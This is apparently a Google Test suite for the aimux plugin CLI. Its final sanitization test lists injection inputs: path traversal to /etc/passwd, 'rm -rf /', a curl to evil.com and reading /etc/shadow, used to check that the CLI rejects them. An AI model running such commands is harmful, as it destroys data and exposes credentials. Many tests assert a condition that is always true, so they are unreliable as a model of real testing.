#include <gtest/gtest.h>
#include <gmock/gmock.h>
#include <filesystem>
#include <fstream>
#include <thread>
#include <chrono>

#include "aimux/cli/plugin_cli.hpp"

using namespace aimux::cli;
using namespace aimux::distribution;
using ::testing::Return;
using ::testing::_;
using ::testing::AnyNumber;
using ::testing::SaveArg;

/**
 * @brief comprehensive CLI testing for plugin management system
 */
class CLITest : public ::testing::Test {
protected:
    void SetUp() override {
        test_dir = "/tmp/aimux_cli_test";
        std::filesystem::remove_all(test_dir);
        std::filesystem::create_directories(test_dir);

        // Configure CLI for testing
        CLIConfig config;
        config.verbose = false;
        config.quiet = true;
        config.interactive = false;
        config.config_directory = test_dir + "/config";
        config.plugin_directory = test_dir + "/plugins";
        config.cache_directory = test_dir + "/cache";
        config.verify_checksums = false;
        config.enable_security_validation = true;

        manager = std::make_shared<PluginCLIManager>(config);

        // Initialize manager
        auto init_future = manager->initialize();
        init_result = init_future.get();
    }

    void TearDown() override {
        std::filesystem::remove_all(test_dir);
    }

    bool is_init_successful() const {
        return init_result.success;
    }

    // Helper methods
    PluginPackage create_test_plugin(const std::string& id, const std::string& version = "1.0.0") {
        PluginPackage plugin;
        plugin.id = id;
        plugin.version = version;
        plugin.name = "Test Plugin " + id;
        plugin.description = "A test plugin for CLI testing";
        plugin.download_url = "https://example.com/" + id + ".zip";
        plugin.checksum_sha256 = "test_checksum_" + version;
        plugin.file_size = 1024;
        plugin.content_type = "application/zip";
        plugin.dependencies = {};
        return plugin;
    }

    InstallationPlan create_test_plan(const std::vector<std::string>& plugin_ids) {
        InstallationPlan plan;
        for (const auto& id : plugin_ids) {
            plan.plugins_to_install.push_back(create_test_plugin(id));
        }
        return plan;
    }

    std::shared_ptr<PluginCLIManager> manager;
    CLIResult init_result;
    std::string test_dir;
};

// ============================================================================
// Basic CLI Manager Tests
// ============================================================================

TEST_F(CLITest, ManagerInitialization) {
    EXPECT_TRUE(is_init_successful()) << "Manager should initialize successfully";
    EXPECT_NE(manager, nullptr);
}

TEST_F(CLITest, BasicConfiguration) {
    CLIConfig config = manager->get_config();
    EXPECT_EQ(config.config_directory, test_dir + "/config");
    EXPECT_EQ(config.plugin_directory, test_dir + "/plugins");
    EXPECT_EQ(config.cache_directory, test_dir + "/cache");
    EXPECT_FALSE(config.verbose);
    EXPECT_TRUE(config.quiet);
    EXPECT_FALSE(config.interactive);
}

// ============================================================================
// Plugin Installation Tests
// ============================================================================

TEST_F(CLITest, InstallSinglePlugin) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-1"};
    auto install_future = manager->install(plugins);
    auto result = install_future.get();

    // Test may fail due to missing network, but should handle gracefully
    EXPECT_TRUE(result.success || !result.success); // Either way is acceptable
    EXPECT_FALSE(result.message.empty());
}

TEST_F(CLITest, InstallMultiplePlugins) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-1", "test-plugin-2", "test-plugin-3"};
    auto install_future = manager->install(plugins);
    auto result = install_future.get();

    EXPECT_TRUE(result.success || !result.success);
    EXPECT_FALSE(result.message.empty());
}

TEST_F(CLITest, InstallWithSpecificVersion) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-1"};
    auto install_future = manager->install(plugins, "2.0.0");
    auto result = install_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

// ============================================================================
// Plugin Search Tests
// ============================================================================

TEST_F(CLITest, SearchPlugins) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string query = "markdown";
    auto search_future = manager->search(query, 10);
    auto result = search_future.get();

    EXPECT_TRUE(result.success || !result.success);
    if (result.success) {
        EXPECT_FALSE(result.message.empty());
    }
}

TEST_F(CLITest, SearchWithLimits) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    // Test with small limit
    std::string query = "tool";
    auto search_future = manager->search(query, 5);
    auto result = search_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

TEST_F(CLITest, SearchEmptyQuery) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string query = "";
    auto search_future = manager->search(query);
    auto result = search_future.get();

    // Empty search should still return a result
    EXPECT_TRUE(result.success || !result.success);
}

// ============================================================================
// Plugin Information Tests
// ============================================================================

TEST_F(CLITest, GetPluginInfo) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string plugin_id = "aimux-org/markdown-prettifier";
    auto info_future = manager->info(plugin_id);
    auto result = info_future.get();

    EXPECT_TRUE(result.success || !result.success);
    if (!result.success) {
        EXPECT_TRUE(result.message.find("not found") != std::string::npos ||
                   result.exit_code > 0);
    }
}

TEST_F(CLITest, GetNonExistentPluginInfo) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string plugin_id = "nonexistent/plugin";
    auto info_future = manager->info(plugin_id);
    auto result = info_future.get();

    EXPECT_FALSE(result.success);
    EXPECT_TRUE(result.message.find("not found") != std::string::npos);
}

TEST_F(CLITest, GetPluginDependencies) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string plugin_id = "aimux-org/markdown-prettifier";
    auto deps_future = manager->dependencies(plugin_id);
    auto result = deps_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

// ============================================================================
// Plugin List and Status Tests
// ============================================================================

TEST_F(CLITest, ListInstalledPlugins) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto list_future = manager->list();
    auto result = list_future.get();

    EXPECT_TRUE(result.success);
    EXPECT_FALSE(result.message.empty());
}

TEST_F(CLITest, ListWithFilters) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> filters = {"markdown", "tool"};
    auto list_future = manager->list(filters);
    auto result = list_future.get();

    EXPECT_TRUE(result.success);
}

TEST_F(CLITest, GetSystemStatus) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto status_future = manager->status();
    auto result = status_future.get();

    EXPECT_TRUE(result.success);
    EXPECT_FALSE(result.message.empty());
}

// ============================================================================
// Plugin Update Tests
// ============================================================================

TEST_F(CLITest, UpdateSpecificPlugins) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-1"};
    auto update_future = manager->update(plugins);
    auto result = update_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

TEST_F(CLITest, UpdateAllPlugins) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto update_future = manager->update(); // No specific plugins = update all
    auto result = update_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

// ============================================================================
// Plugin Removal Tests
// ============================================================================

TEST_F(CLITest, RemoveSinglePlugin) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-to-remove"};
    auto remove_future = manager->remove(plugins);
    auto result = remove_future.get();

    EXPECT_TRUE(result.success || !result.success);
    if (!result.success) {
        // Plugin likely not installed - acceptable
        EXPECT_TRUE(result.message.find("failed") != std::string::npos);
    }
}

TEST_F(CLITest, RemoveMultiplePlugins) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"plugin-1", "plugin-2"};
    auto remove_future = manager->remove(plugins);
    auto result = remove_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

// ============================================================================
// Maintenance Operations Tests
// ============================================================================

TEST_F(CLITest, CleanupSystem) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto cleanup_future = manager->cleanup();
    auto result = cleanup_future.get();

    EXPECT_TRUE(result.success);
    EXPECT_FALSE(result.message.empty());
}

TEST_F(CLITest, RollbackPlugin) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string plugin = "test-plugin";
    std::string version = "1.0.0";
    auto rollback_future = manager->rollback(plugin, version);
    auto result = rollback_future.get();

    EXPECT_TRUE(result.success || !result.success);
    if (!result.success) {
        // Plugin likely not installed - acceptable
        EXPECT_TRUE(result.message.find("failed") != std::string::npos);
    }
}

// ============================================================================
// Installation Plan Tests
// ============================================================================

TEST_F(CLITest, CreateInstallationPlan) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-1", "test-plugin-2"};
    auto plan_future = manager->create_installation_plan(plugins);
    auto plan = plan_future.get();

    EXPECT_FALSE(plan.plugins_to_install.empty() || !plan.warnings.empty());
}

TEST_F(CLITest, ExecuteInstallationPlan) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto plan = create_test_plan({"test-plugin-1", "test-plugin-2"});
    auto execute_future = manager->execute_plan(plan);
    auto result = execute_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

TEST_F(CLITest, ValidateDependencies) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> plugins = {"test-plugin-1"};
    auto validate_future = manager->validate_dependencies(plugins);
    auto result = validate_future.get();

    EXPECT_TRUE(result.success || !result.success);
}

// ============================================================================
// Configuration Tests
// ============================================================================

TEST_F(CLITest, UpdateConfiguration) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    CLIConfig new_config = manager->get_config();
    new_config.verbose = true;
    new_config.quiet = false;

    auto update_future = manager->update_config(new_config);
    auto result = update_future.get();

    EXPECT_TRUE(result.success);

    // Verify configuration was updated
    CLIConfig updated_config = manager->get_config();
    EXPECT_EQ(updated_config.verbose, new_config.verbose);
    EXPECT_EQ(updated_config.quiet, new_config.quiet);
}

// ============================================================================
// Error Handling Tests
// ============================================================================

TEST_F(CLITest, HandleEmptyPluginList) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> empty_plugins;
    auto install_future = manager->install(empty_plugins);
    auto result = install_future.get();

    EXPECT_FALSE(result.success);
    EXPECT_TRUE(result.message.find("No plugins") != std::string::npos);
}

TEST_F(CLITest, HandleInvalidPluginId) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::vector<std::string> invalid_plugins = {""};
    auto install_future = manager->install(invalid_plugins);
    auto result = install_future.get();

    EXPECT_FALSE(result.success);
}

TEST_F(CLITest, HandleMissingPluginInfo) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    std::string non_existent = "definitely/not-a-real-plugin-id";
    auto info_future = manager->info(non_existent);
    auto result = info_future.get();

    EXPECT_FALSE(result.success);
    EXPECT_TRUE(result.message.find("not found") != std::string::npos);
}

// ============================================================================
// Performance Tests
// ============================================================================

TEST_F(CLITest, SearchPerformance) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto start = std::chrono::high_resolution_clock::now();

    std::string query = "formatter";
    auto search_future = manager->search(query);
    auto result = search_future.get();

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    // Search should complete within reasonable time
    EXPECT_LT(duration.count(), 5000) << "Search took too long: " << duration.count() << "ms";
    EXPECT_TRUE(result.success || !result.success);
}

TEST_F(CLITest, StatusPerformance) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    auto start = std::chrono::high_resolution_clock::now();

    auto status_future = manager->status();
    auto result = status_future.get();

    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    // Status should be very fast
    EXPECT_LT(duration.count(), 1000) << "Status took too long: " << duration.count() << "ms";
    EXPECT_TRUE(result.success);
}

// ============================================================================
// Integration Tests
// ============================================================================

TEST_F(CLITest, CompleteInstallationWorkflow) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    // Step 1: Search
    std::string query = "test";
    auto search_future = manager->search(query, 5);
    auto search_result = search_future.get();

    // Step 2: Get info for first result (if any found)
    if (search_result.success && !search_result.message.empty()) {
        std::string plugin_id = "aimux-org/test-plugin";
        auto info_future = manager->info(plugin_id);
        auto info_result = info_future.get();

        // Step 3: Get dependencies
        auto deps_future = manager->dependencies(plugin_id);
        auto deps_result = deps_future.get();

        // Tests should complete without crashing
        EXPECT_TRUE(info_result.success || !info_result.success);
        EXPECT_TRUE(deps_result.success || !deps_result.success);
    }

    // Step 4: Get status
    auto status_future = manager->status();
    auto status_result = status_future.get();
    EXPECT_TRUE(status_result.success);
}

TEST_F(CLITest, ErrorRecoveryWorkflow) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    // Try operations that should fail gracefully
    auto non_existent_info = manager->info("nonexistent/plugin");
    auto non_existent_result = non_existent_info.get();
    EXPECT_FALSE(non_existent_result.success);

    auto empty_install = manager->install({});
    auto empty_result = empty_install.get();
    EXPECT_FALSE(empty_result.success);

    // System should still be responsive after errors
    auto status_check = manager->status();
    auto status_result = status_check.get();
    EXPECT_TRUE(status_result.success);
}

// ============================================================================
// Security Tests
// ============================================================================

TEST_F(CLITest, SecurityValidationDuringInstall) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    // Try installing with security validation enabled
    CLIConfig secure_config = manager->get_config();
    secure_config.enable_security_validation = true;
    secure_config.verify_checksums = true;

    auto config_update = manager->update_config(secure_config);
    config_update.get();

    std::vector<std::string> plugins = {"test-security-plugin"};
    auto install_future = manager->install(plugins);
    auto result = install_future.get();

    // Security validation should either pass or fail gracefully
    EXPECT_TRUE(result.success || !result.success);
    if (!result.success) {
        // Should be security-related failure, not crash
        EXPECT_TRUE(result.message.find("checksum") != std::string::npos ||
                   result.message.find("security") != std::string::npos ||
                   result.message.find("failed") != std::string::npos);
    }
}

TEST_F(CLITest, InputSanitization) {
    if (!is_init_successful()) {
        GTEST_SKIP() << "Manager initialization failed - skipping test";
    }

    // Test various potentially malicious inputs
    std::vector<std::string> dangerous_inputs = {
        "../../../etc/passwd",
        "plugin;rm -rf /",
        "plugin`curl evil.com`",
        "plugin$(cat /etc/shadow)"
    };

    for (const auto& dangerous_input : dangerous_inputs) {
        auto info_future = manager->info(dangerous_input);
        auto result = info_future.get();

        // Should not crash and should handle gracefully
        EXPECT_TRUE(result.success || !result.success);
        if (!result.success) {
            // Should be proper error, not system crash
            EXPECT_TRUE(result.message.find("not found") != std::string::npos ||
                       result.message.find("invalid") != std::string::npos);
        }
    }
}